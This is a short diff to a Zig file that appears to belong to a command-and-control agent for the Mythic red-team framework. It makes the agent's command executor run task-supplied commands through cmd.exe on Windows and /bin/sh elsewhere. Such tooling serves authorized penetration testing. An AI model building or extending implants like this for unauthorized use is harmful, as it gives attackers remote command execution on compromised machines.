@@ -1,4 +1,5 @@
 const std = @import("std");
+const builtin = @import("builtin");
 const types = @import("types.zig");
 const json = std.json;
 const base64 = std.base64;
@@ -55,9 +56,11 @@ pub const CommandExecutor = struct {
                 .status = "error",
             };
         }
+        const shell_path = if (builtin.os.tag == .windows) "cmd.exe" else "/bin/sh";
+        const shell_args  = if (builtin.os.tag == .windows) "/c"     else "-c";
         const result = std.process.Child.run(.{
             .allocator = self.allocator,
-            .argv = &[_][]const u8{ "/bin/sh", "-c", command },
+            .argv = &[_][]const u8{ shell_path, shell_args, command },
         }) catch |err| {
             return MythicResponse{
                 .task_id = task.id,
